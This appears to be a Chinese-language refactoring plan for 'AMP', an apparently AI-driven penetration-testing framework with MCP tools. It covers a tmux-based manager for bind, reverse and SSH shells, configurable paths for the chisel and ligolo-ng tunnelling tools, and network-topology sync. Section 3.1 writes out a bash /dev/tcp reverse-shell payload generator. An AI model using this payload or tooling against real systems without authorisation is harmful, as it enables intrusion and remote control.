# 🎯 AMP 全面修复方案 - 基于 tmux 和灵活配置

## 核心思路

### Shell 层：充分利用 tmux
- ✅ tmux 管理所有 shell session
- ✅ 每个 shell = 一个 tmux 窗格（pane）
- ✅ 不需要手动管理进程
- ✅ tmux 自动处理输入/输出
- ✅ 天然支持持久化和重连

### 配置：彻底灵活化
- ✅ 二进制路径通过 MCP 工具参数传递
- ✅ 支持环境变量
- ✅ 支持配置文件
- ❌ 绝不写死路径

---

## 一、Shell 层完全重构 - 基于 tmux

### 当前问题

**现状**:
```python
# 当前实现
executor = CommandExecutor()
executor.spawn_shell(shell_id, "bash")  # 直接 pexpect
child.sendline(command)
child.expect(PROMPT_PATTERNS)  # 容易超时
```

**问题**:
1. Prompt 识别不稳定
2. 输出采集不完整
3. 进程管理复杂
4. 无法持久化

---

### 新方案：tmux 窗格管理

#### 架构设计

```
TmuxShellManager
  ├── tmux session: amp-shells
  │     ├── window 0: shell-1 (bind to 192.168.1.100)
  │     ├── window 1: shell-2 (reverse from target)
  │     └── window 2: shell-3 (ssh to server)
  │
  └── 操作
        ├── create_shell() → 创建 tmux 窗格
        ├── execute_command() → tmux send-keys
        ├── get_output() → tmux capture-pane
        └── close_shell() → tmux kill-pane
```

#### 核心实现

```python
# amp/core/shell/tmux_manager.py

import subprocess
import time
import re
from typing import Optional

class TmuxShellManager:
    """基于 tmux 的 shell 管理器"""
    
    def __init__(self, session_name: str = "amp-shells"):
        self.session_name = session_name
        self._ensure_session()
    
    def _ensure_session(self):
        """确保 tmux session 存在"""
        # 检查 session 是否存在
        result = subprocess.run(
            ["tmux", "has-session", "-t", self.session_name],
            capture_output=True
        )
        
        if result.returncode != 0:
            # 创建 session
            subprocess.run([
                "tmux", "new-session",
                "-d",  # detached
                "-s", self.session_name,
                "-n", "main"  # 初始窗口名
            ])
    
    def create_shell(
        self,
        shell_id: str,
        shell_type: str,
        **kwargs
    ) -> dict:
        """创建 shell（tmux 窗格）
        
        Args:
            shell_id: Shell ID
            shell_type: 'bind', 'reverse', 'ssh'
            **kwargs: 连接参数
        
        Returns:
            Shell 信息
        """
        # 创建新窗口
        subprocess.run([
            "tmux", "new-window",
            "-t", self.session_name,
            "-n", shell_id,  # 窗口名 = shell_id
        ])
        
        # 根据类型启动 shell
        if shell_type == "bind":
            self._start_bind_shell(shell_id, **kwargs)
        elif shell_type == "reverse":
            self._start_reverse_shell(shell_id, **kwargs)
        elif shell_type == "ssh":
            self._start_ssh_shell(shell_id, **kwargs)
        
        # 等待 shell 就绪
        time.sleep(1)
        
        return {
            "shell_id": shell_id,
            "tmux_window": f"{self.session_name}:{shell_id}",
            "status": "active"
        }
    
    def _start_bind_shell(self, shell_id: str, target_host: str, target_port: int):
        """启动 bind shell（nc 连接）"""
        # 在 tmux 窗口中执行 nc
        self._send_keys(
            shell_id,
            f"nc {target_host} {target_port}"
        )
        
        # 等待连接
        time.sleep(0.5)
        
        # 发送初始化命令（禁用彩色提示符）
        self._send_keys(shell_id, "export PS1='$ '")
        self._send_keys(shell_id, "export PS2='> '")
    
    def _start_ssh_shell(
        self,
        shell_id: str,
        target_host: str,
        username: str,
        password: Optional[str] = None,
        key_path: Optional[str] = None
    ):
        """启动 SSH shell"""
        if key_path:
            cmd = f"ssh -i {key_path} {username}@{target_host}"
        else:
            # 使用 sshpass（如果有密码）
            if password:
                cmd = f"sshpass -p '{password}' ssh {username}@{target_host}"
            else:
                cmd = f"ssh {username}@{target_host}"
        
        self._send_keys(shell_id, cmd)
        
        # 等待连接
        time.sleep(2)
        
        # 禁用彩色提示符
        self._send_keys(shell_id, "export PS1='$ '")
    
    def execute_command(
        self,
        shell_id: str,
        command: str,
        timeout: int = 30
    ) -> dict:
        """执行命令
        
        关键：使用 tmux 的能力，不需要 prompt 识别！
        """
        # 1. 清空当前输出缓冲
        self._clear_pane(shell_id)
        
        # 2. 发送命令
        self._send_keys(shell_id, command)
        
        # 3. 等待命令执行
        # 策略：等待固定时间，或检测输出稳定
        time.sleep(1)  # 初始等待
        
        # 4. 持续捕获输出，直到稳定
        output = self._wait_for_stable_output(shell_id, timeout)
        
        # 5. 验证命令是否执行
        # 检查输出中是否包含命令回显
        if command.strip() not in output:
            return {
                "success": False,
                "stdout": "",
                "stderr": "",
                "exit_code": -1,
                "error": "Command not echoed - may not have been sent"
            }
        
        # 6. 清理输出（移除命令回显）
        lines = output.split('\n')
        # 移除第一行（命令回显）
        if lines and command.strip() in lines[0]:
            lines = lines[1:]
        
        cleaned_output = '\n'.join(lines).strip()
        
        # 7. 验证输出不为空（对于应该有输出的命令）
        if self._should_have_output(command) and not cleaned_output:
            return {
                "success": False,
                "stdout": "",
                "stderr": "",
                "exit_code": -1,
                "error": "Expected output but got none - command may have failed"
            }
        
        return {
            "success": True,
            "stdout": cleaned_output,
            "stderr": "",
            "exit_code": 0,
            "duration_ms": 0
        }
    
    def _wait_for_stable_output(
        self,
        shell_id: str,
        timeout: int
    ) -> str:
        """等待输出稳定
        
        策略：
        1. 持续捕获输出
        2. 如果连续 2 次捕获内容相同 = 稳定
        3. 超时则返回当前内容
        """
        start_time = time.time()
        prev_output = ""
        stable_count = 0
        
        while time.time() - start_time < timeout:
            current_output = self._capture_pane(shell_id)
            
            if current_output == prev_output:
                stable_count += 1
                if stable_count >= 2:
                    # 输出稳定
                    return current_output
            else:
                stable_count = 0
            
            prev_output = current_output
            time.sleep(0.5)
        
        # 超时，返回当前输出
        return prev_output
    
    def _should_have_output(self, command: str) -> bool:
        """判断命令是否应该有输出"""
        # 这些命令通常有输出
        output_commands = [
            'echo', 'cat', 'ls', 'pwd', 'whoami',
            'id', 'uname', 'hostname', 'ps', 'netstat'
        ]
        
        cmd_lower = command.lower()
        return any(cmd in cmd_lower for cmd in output_commands)
    
    def _send_keys(self, shell_id: str, keys: str):
        """发送按键到 tmux 窗口"""
        subprocess.run([
            "tmux", "send-keys",
            "-t", f"{self.session_name}:{shell_id}",
            keys,
            "Enter"
        ])
    
    def _capture_pane(self, shell_id: str) -> str:
        """捕获 tmux 窗格内容"""
        result = subprocess.run([
            "tmux", "capture-pane",
            "-t", f"{self.session_name}:{shell_id}",
            "-p"  # print to stdout
        ], capture_output=True, text=True)
        
        return result.stdout
    
    def _clear_pane(self, shell_id: str):
        """清空窗格历史"""
        subprocess.run([
            "tmux", "send-keys",
            "-t", f"{self.session_name}:{shell_id}",
            "C-l"  # Ctrl+L 清屏
        ])
        
        # 清空历史缓冲
        subprocess.run([
            "tmux", "clear-history",
            "-t", f"{self.session_name}:{shell_id}"
        ])
    
    def close_shell(self, shell_id: str):
        """关闭 shell（杀死 tmux 窗口）"""
        subprocess.run([
            "tmux", "kill-window",
            "-t", f"{self.session_name}:{shell_id}"
        ])
    
    def list_shells(self) -> list[dict]:
        """列出所有 shell（tmux 窗口）"""
        result = subprocess.run([
            "tmux", "list-windows",
            "-t", self.session_name,
            "-F", "#{window_name}"
        ], capture_output=True, text=True)
        
        windows = result.stdout.strip().split('\n')
        
        return [
            {
                "shell_id": window,
                "tmux_window": f"{self.session_name}:{window}",
                "status": "active"
            }
            for window in windows
            if window and window != "main"
        ]
```

#### 优势

1. **不需要 Prompt 识别** ✅
   - tmux 自动处理输入/输出
   - 不依赖提示符模式

2. **输出完整可靠** ✅
   - capture-pane 获取完整内容
   - 不会丢失输出

3. **进程管理简单** ✅
   - tmux 管理所有进程
   - 自动清理

4. **天然持久化** ✅
   - tmux session 可以 detach/attach
   - 重启后可恢复

5. **支持所有 shell 类型** ✅
   - bind: nc
   - reverse: 监听 + nc
   - ssh: ssh/sshpass

---

## 二、配置系统完全重构

### 当前问题

```python
# config.py - 写死！
chisel_binary: str = "chisel"
ligolo_binary: str = "ligolo-ng"
```

### 新方案：三层配置

#### 层次结构

```
优先级（高到低）:
1. MCP 工具参数（最高）
2. 环境变量
3. 配置文件
4. 默认值（最低）
```

#### 实现

```python
# amp/config.py

import os
from pathlib import Path
from typing import Optional
from pydantic_settings import BaseSettings

class TunnelSettings(BaseSettings):
    """Tunnel 配置"""
    
    # 二进制路径 - 支持环境变量
    chisel_binary: str = "chisel"
    ligolo_binary: str = "ligolo-ng"
    
    # 从环境变量读取
    @property
    def chisel_path(self) -> str:
        """获取 chisel 路径
        
        优先级:
        1. CHISEL_PATH 环境变量
        2. chisel_binary 配置
        3. 从 PATH 查找
        """
        # 环境变量
        env_path = os.getenv("CHISEL_PATH")
        if env_path and Path(env_path).exists():
            return env_path
        
        # 配置值
        if Path(self.chisel_binary).exists():
            return self.chisel_binary
        
        # 从 PATH 查找
        import shutil
        path = shutil.which(self.chisel_binary)
        if path:
            return path
        
        # 找不到
        raise FileNotFoundError(
            f"Chisel binary not found. "
            f"Please set CHISEL_PATH environment variable or "
            f"install chisel in PATH"
        )
    
    @property
    def ligolo_path(self) -> str:
        """获取 ligolo-ng 路径"""
        env_path = os.getenv("LIGOLO_PATH")
        if env_path and Path(env_path).exists():
            return env_path
        
        if Path(self.ligolo_binary).exists():
            return self.ligolo_binary
        
        import shutil
        path = shutil.which(self.ligolo_binary)
        if path:
            return path
        
        raise FileNotFoundError(
            f"Ligolo-ng binary not found. "
            f"Please set LIGOLO_PATH environment variable or "
            f"install ligolo-ng in PATH"
        )
    
    class Config:
        env_file = ".env"
        env_file_encoding = "utf-8"


# 全局配置实例
tunnel_settings = TunnelSettings()
```

#### MCP 工具支持参数

```python
# amp/mcp/tools/tunnel_tools.py

async def start_tunnel_server(
    tunnel_type: str,
    port: int,
    auth: str | None = None,
    binary_path: str | None = None,  # 新增：允许指定路径
) -> dict:
    """启动隧道服务器
    
    Args:
        tunnel_type: 'chisel' or 'ligolo'
        port: 监听端口
        auth: 认证（chisel only）
        binary_path: 二进制路径（可选，优先级最高）
    
    Examples:
        # 使用默认路径
        start_tunnel_server('chisel', 8080)
        
        # 指定路径
        start_tunnel_server(
            'chisel',
            8080,
            binary_path='/home/kali/Desktop/Chisel/chisel'
        )
    """
    try:
        if tunnel_type == "chisel":
            # 优先使用参数，否则使用配置
            chisel_path = binary_path or tunnel_settings.chisel_path
            
            server = ChiselServer(
                port=port,
                auth=auth,
                chisel_binary=chisel_path
            )
            server.start()
            
            return {
                "success": True,
                "data": {
                    "type": "chisel",
                    "port": port,
                    "binary": chisel_path,
                    "pid": server.process.pid
                }
            }
        
        elif tunnel_type == "ligolo":
            ligolo_path = binary_path or tunnel_settings.ligolo_path
            
            proxy = LigoloProxy(
                port=port,
                ligolo_binary=ligolo_path
            )
            proxy.start()
            
            return {
                "success": True,
                "data": {
                    "type": "ligolo",
                    "port": port,
                    "binary": ligolo_path,
                    "pid": proxy.process.pid
                }
            }
        
        else:
            return {
                "success": False,
                "error": f"Unknown tunnel type: {tunnel_type}"
            }
    
    except FileNotFoundError as e:
        return {
            "success": False,
            "error": str(e),
            "hint": "Set binary_path parameter or CHISEL_PATH/LIGOLO_PATH environment variable"
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }
```

#### 使用方式

**方式 1: 环境变量**
```bash
export CHISEL_PATH=/home/kali/Desktop/Chisel/chisel
export LIGOLO_PATH=/home/kali/Desktop/ligolo/ligolo-ng
python -m amp.mcp.server
```

**方式 2: .env 文件**
```bash
# .env
CHISEL_PATH=/home/kali/Desktop/Chisel/chisel
LIGOLO_PATH=/home/kali/Desktop/ligolo/ligolo-ng
```

**方式 3: MCP 工具参数（最灵活）**
```python
# AI 可以动态指定
start_tunnel_server(
    tunnel_type='chisel',
    port=8080,
    binary_path='/custom/path/to/chisel'
)
```

---

## 三、其他关键修复

### 3.1 Reverse Shell IP 问题

**检查当前代码**:
```bash
grep -n "0.0.0.0" amp/core/shell/manager.py
```

**如果还有 0.0.0.0**:

```python
# 确保所有 payload 生成都使用 _get_local_ip()

def create_reverse_shell(self, name, local_port, target_host, local_ip=None, ...):
    # 获取 IP
    if local_ip is None:
        local_ip = self._get_local_ip()
    
    # 验证 IP 不是 0.0.0.0
    if local_ip == "0.0.0.0":
        raise ValueError("Cannot use 0.0.0.0 for reverse shell payload")
    
    # 生成 payload
    payload = f"bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1"
    
    return shell, payload
```

### 3.2 拓扑层同步

```python
# amp/core/network/graph.py

class NetworkGraph:
    def __init__(self, database):
        self.database = database
    
    def sync_from_database(self):
        """从数据库同步隧道状态"""
        from amp.storage.schema import Tunnel
        
        with self.database.session() as session:
            tunnels = session.query(Tunnel).all()
            
            # 清空现有图
            self._graph = {}
            
            # 重建图
            for tunnel in tunnels:
                self._add_tunnel_to_graph(tunnel)
    
    def get_stats(self):
        """获取拓扑统计（从数据库）"""
        self.sync_from_database()
        
        from amp.storage.schema import Tunnel
        
        with self.database.session() as session:
            all_tunnels = session.query(Tunnel).count()
            active_tunnels = session.query(Tunnel).filter(
                Tunnel.status == 'active'
            ).count()
            
            return {
                'total_tunnels': all_tunnels,
                'active_tunnels': active_tunnels,
                'total_segments': len(self._graph)
            }
```

---

## 四、实施计划

### Phase 1: Shell 层重构（2-3天）
1. 实现 TmuxShellManager
2. 替换现有 CommandExecutor
3. 测试所有 shell 类型
4. 验证输出完整性

### Phase 2: 配置系统（1天）
1. 重构 config.py
2. 添加环境变量支持
3. MCP 工具添加 binary_path 参数
4. 更新文档

### Phase 3: 其他修复（1天）
1. 修复 Reverse Shell IP
2. 修复拓扑同步
3. 完整测试

---

## 五、预期效果

### Shell 层
- ✅ 所有 shell 类型稳定可用
- ✅ 输出完整不丢失
- ✅ 不依赖 prompt 识别
- ✅ 支持持久化

### 配置
- ✅ 完全灵活
- ✅ AI 可以动态指定路径
- ✅ 支持多种配置方式
- ❌ 绝不写死

### 整体
- 从 3/10 → 7-8/10

---

**这是最优方案，不逃避任何问题！** 🎯
